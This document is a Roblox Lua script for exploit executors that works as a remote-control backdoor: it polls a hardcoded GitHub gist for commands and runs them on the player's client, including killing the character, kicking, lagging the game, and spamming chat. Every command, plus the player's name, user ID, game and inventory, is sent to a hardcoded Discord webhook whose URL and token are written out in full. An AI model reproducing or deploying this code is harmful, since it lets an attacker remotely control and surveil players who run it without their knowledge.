local request = (syn and syn.request) or (http and http.request) or http_request or request
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Lighting = game:GetService("Lighting")

local LocalPlayer = Players.LocalPlayer
local GIST_URL = "https://gist.githubusercontent.com/arxitectorcz/fa2e7f22f682569b974a71810463d388/raw/"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1465626358351794206/Vd6C9UGjjUhiH5xUdy1rv2AbwPwRqQIHrozSDyW1a0k5VoNd2k_-d2U3PgurZVkRMbl0"

local lastCommand = "" 
local loops = {spam = false, lag = nil}

local function getInventory()
	local items = {}
	for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do table.insert(items, v.Name) end
	if LocalPlayer.Character then
		for _, v in pairs(LocalPlayer.Character:GetChildren()) do
			if v:IsA("Tool") then table.insert(items, v.Name .. " (E)") end
		end
	end
	return #items > 0 and table.concat(items, ", ") or "Empty"
end

local function sendWebhook(title, desc, color, extraField)
	local pInfo = MarketplaceService:GetProductInfo(game.PlaceId)
	local fields = {
		{["name"] = "👤 Player", ["value"] = string.format("[%s](https://www.roblox.com/users/%d/profile)", LocalPlayer.Name, LocalPlayer.UserId), ["inline"] = true},
		{["name"] = "🎮 Game", ["value"] = string.format("[%s](https://www.roblox.com/games/%d/)", pInfo.Name, game.PlaceId), ["inline"] = true},
		{["name"] = "🎒 Inventory", ["value"] = "```" .. getInventory() .. "```", ["inline"] = false}
	}
	if extraField then table.insert(fields, extraField) end
	pcall(function()
		request({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode({["embeds"] = {{["title"] = title, ["description"] = desc, ["color"] = color, ["fields"] = fields, ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"}, ["footer"] = {["text"] = "Gist-Control • "..os.date("%X")}}}})
		})
	end)
end

local function resetStates()
	loops.spam = false
	if loops.lag then loops.lag:Disconnect() loops.lag = nil end
	local char = LocalPlayer.Character
	local hum = char and char:FindFirstChild("Humanoid")
	if hum then hum.WalkSpeed = 16 hum.JumpPower = 50 end
	if char and char:FindFirstChild("HumanoidRootPart") then
		local f = char.HumanoidRootPart:FindFirstChild("GistFire")
		if f then f:Destroy() end
	end
	Lighting.Brightness = 2 Lighting.ClockTime = 14
end

local function execute(text)
	resetStates()
	local args = string.split(text, " ")
	local cmd = args[1]:lower()
	local val = table.concat(args, " ", 2)
	local char = LocalPlayer.Character
	local hum = char and char:FindFirstChild("Humanoid")

	if cmd == "kill" and hum then hum.Health = 0
	elseif cmd == "kick" then LocalPlayer:Kick(val)
	elseif cmd == "rejoin" then TeleportService:Teleport(game.PlaceId)
	elseif cmd == "speed" and hum then hum.WalkSpeed = tonumber(val) or 16
	elseif cmd == "jump" and hum then hum.JumpPower = tonumber(val) or 50
	elseif cmd == "message" then 
		local sg = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
		local l = Instance.new("TextLabel", sg)
		l.Size, l.BackgroundTransparency, l.TextColor3, l.TextScaled, l.Text = UDim2.new(1,0,1,0), 1, Color3.new(1,0,0), true, val
		task.delay(5, function() sg:Destroy() end)
	elseif cmd == "fire" and char then 
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if hrp then local f = Instance.new("Fire", hrp) f.Name = "GistFire" f.Size = 15 end
	elseif cmd == "darktime" then 
		Lighting.Brightness = 0 Lighting.ClockTime = 0
	elseif cmd == "lag" then 
		loops.lag = RunService.Heartbeat:Connect(function() local t = tick() while tick() - t < 0.15 do end end)
	elseif cmd == "chat_spam" then
		loops.spam = true
		task.spawn(function()
			while loops.spam do
				local ce = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
				if ce then ce.SayMessageRequest:FireServer(val, "All") end
				task.wait(0.5)
			end
		end)
	end
	sendWebhook("⚡ Command Updated", "**New Cmd:** `" .. text .. "`", 0xFF0044)
end

task.spawn(function()
	sendWebhook("🚀 System Online", "Monitoring Gist every 2s.", 0x00BFFF)
	while true do
		local success, res = pcall(function() return request({Url = GIST_URL .. "?t=" .. tick(), Method = "GET"}) end)
		if success and res.Body then
			local cmd = res.Body:gsub("^%s*(.-)%s*$", "%1")
			if cmd ~= lastCommand and cmd ~= "" then
				lastCommand = cmd
				execute(cmd)
			end
		end
		task.wait(2)
	end
end)
